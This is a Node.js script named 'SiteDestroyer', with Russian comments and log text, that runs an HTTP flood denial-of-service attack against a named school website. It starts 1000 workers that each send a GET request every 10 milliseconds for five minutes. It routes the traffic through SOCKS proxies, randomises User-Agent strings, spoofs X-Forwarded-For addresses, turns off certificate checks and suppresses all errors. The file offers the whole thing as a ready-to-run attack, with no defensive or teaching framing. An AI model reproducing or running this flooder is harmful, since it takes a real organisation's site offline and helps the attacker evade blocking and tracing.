const http = require('http');
const https = require('https');
const URL = require('url');
const { SocksProxyAgent } = require('socks-proxy-agent');
const randomUA = require('random-useragent');

class SiteDestroyer {
  constructor(target, options = {}) {
    this.target = URL.parse(target);
    this.proxies = options.proxies || [];
    this.workers = options.workers || 500;
    this.duration = options.duration || 60000;
    this.attackCounter = this.attack.bind(this);
  }

  getRandomProxy() {
    return this.proxies[Math.floor(Math.random() * this.proxies.length)] || null;
  }

  generateHeaders() {
    return {
      'User-Agent': randomUA.getRandom(),
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Connection': 'keep-alive',
      'Cache-Control': 'no-cache',
      'X-Forwarded-For': Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.')
    };
  }

  createRequest(agent) {
    const module = this.target.protocol === 'https:' ? https : http;
    const req = module.request({
      hostname: this.target.hostname,
      port: this.target.port || (this.target.protocol === 'https:' ? 443 : 80),
      path: this.target.path,
      method: 'GET',
      headers: this.generateHeaders(),
      agent: agent,
      rejectUnauthorized: false
    });

    req.on('error', () => {});
    req.end();
  }

  async attack() {
    const proxy = this.getRandomProxy();
    try {
      const agent = proxy ? new SocksProxyAgent(proxy) : null;
      this.createRequest(agent);
    } catch(e) {
      // Подавляем все ошибки
    }
  }

  start() {
    console.log(`[+] Атакую ${this.target.href}`);
    for(let i = 0; i < this.workers; i++) {
      setInterval(this.attack, 10);
    }
    setTimeout(() => process.exit(0), this.duration);
  }
}

// Конфиг
const nuke = new SiteDestroyer('https://oxbridgeschool.uz/.com', {
  proxies: [
    'socks5://user:pass@1.1.1.1:1080',
    'socks4://2.2.2.2:4153'
  ],
  workers: 1000,
  duration: 300000
});

nuke.start();
